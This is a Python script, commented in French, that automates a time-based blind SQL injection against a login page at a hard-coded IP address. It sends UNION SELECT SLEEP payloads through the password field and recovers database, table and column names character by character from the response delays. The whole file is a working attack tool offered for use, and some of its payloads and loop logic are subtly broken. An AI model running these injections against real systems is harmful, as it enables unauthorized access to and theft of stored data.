import requests
import time

def db_name():
    dictionary = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","_"]
    a=0
    db = []
    texte = ""
    TIME = 5
    url = "http://51.15.136.118/pageid.php"
    for i in range(1, 20):
        for j in range(0, len(dictionary)):
            usr = "idc"
            """faire la meme chose avec les ,1,2 qui change en fonction du nombre de tables"""
            passwd = "' UNION SELECT SLEEP(5),1,2 where database() like '" + texte + dictionary[j] + "%' -- "
            """passwd = "' UNION SELECT SLEEP(5),1,2 where database() like '{}{}%' -- ".format(texte, dictionary)"""

            print(passwd)
            start_time = time.time()
            response = requests.post(url, data={'username': usr, 'password': passwd})
            end_time = time.time()
            total_time = end_time - start_time
            """print(total_time)
            print(dictionary[j])"""
            a += 1
            print(a)
            if a > 27:
                break
            if total_time >= TIME:
                texte += dictionary[j]
                print(texte)
                i += 1
                j = 0
                a = 0
                break
    print(texte)
    db.append(texte)
    print(db)

    b=0
    for x in db:
        b += 1
        """print("" + b + "" + db[x] + "|")"""
        """print(str(a) + x)"""
        print("Database {} : {} ".format(b, x))
    
    c = int(input("Choisissez le numéro correspondant au nom de la base de donnée sur laquelle vous voulez continué : "))

    print("Vous avez choisi {}. ".format(db[c-1]))
    final_db=""
    jsp = final_db + "".join(db[c-1])
    print(jsp)
    return jsp

def table_name(database):
    dictionary = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","_"]
    tables_name=[]
    a=0
    texte = ""
    TIME = 5
    url = "http://51.15.136.118/pageid.php"
    for i in range(1, 50):
        for j in range(0, len(dictionary)):
            if a > 27:
                if texte != "":
                    """enlever """
                    rm_letter = texte[0]
                    dictionary.remove(rm_letter)
                    print(dictionary)
                    tables_name.append(texte)
                    texte = ""
                    a=0
                    break
                else:
                    break
            usr = "idc"
            """faire la meme chose avec les ,1,2 qui change en fonction du nombre de tables"""
            passwd = "' UNION SELECT SLEEP(5),1,2 TABLE_NAME FROM information_schema.tables WHERE table_schema='" + database + "' AND TABLE_NAME like '" + texte + dictionary[j] + "%' -- "
            print(passwd)
            start_time = time.time()
            response = requests.post(url, data={'username': usr, 'password': passwd})
            end_time = time.time()
            total_time = end_time - start_time
            """print(total_time)
            print(dictionary[j])"""
            a += 1
            print(texte)
            print(tables_name)
            print(a)
            
            if total_time >= TIME:
                texte += dictionary[j]
                print(texte)
                i += 1
                j = 0
                a = 0
                break
    print(tables_name)
    b=0
    for x in tables_name:
        b += 1
        print("Table {} : {} ".format(b, x))
    
    c = int(input("Choisissez le numéro correspondant au nom de la table sur laquelle vous voulez continué : "))

    print("Vous avez choisi {}. ".format(tables_name[c-1]))
    final_db=""
    jsp2 = final_db + "".join(tables_name[c-1])
    print(jsp2)
    return jsp2

    """ fonctionne 
    final_name = "".join(tables_name[b-1])
    print(final_name)"""



def column_name(database, table):
    dictionary = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
    columns_name=[]
    a=0
    texte = ""
    TIME = 5
    url = "http://51.15.136.118/pageid.php"
    for i in range(1, 50):
        for j in range(0, len(dictionary)):
            if a > 27:
                if texte != "":
                    rm_letter = texte[0]
                    dictionary.remove(rm_letter)
                    print(dictionary)
                    columns_name.append(texte)
                    texte = ""
                    a=0
                    break
                else:
                    break
            usr = "idc"
            passwd = "' UNION SELECT SLEEP(5),1,2 COLUMN_NAME FROM information_schema.columns WHERE table_schema='" + database + "' AND TABLE_NAME='" + table + "' AND COLUMN_NAME like '" + texte + dictionary[j] + "%' -- "
            print(passwd)
            start_time = time.time()
            response = requests.post(url, data={'username': usr, 'password': passwd})
            end_time = time.time()
            total_time = end_time - start_time
            a += 1
            print(texte)
            print(columns_name)
            print(a)
            
            if total_time >= TIME:
                texte += dictionary[j]
                print(texte)
                i += 1
                j = 0
                a = 0
                break
    print(columns_name)
    b=0
    for x in columns_name:
        b += 1
        print("Table {} : {} ".format(b, x))
    c = int(input("Choisissez le numéro correspondant au nom de la colonne sur laquelle vous voulez continué : "))
    print("Vous avez choisi {}. ".format(columns_name[c-1]))
    final_db=""
    jsp3 = final_db + "".join(columns_name[c-1])
    print(jsp3)
    return jsp3


nom_base_de_donnée = db_name()
nom_table = table_name(nom_base_de_donnée)
nom_colonne = column_name(nom_base_de_donnée, nom_table)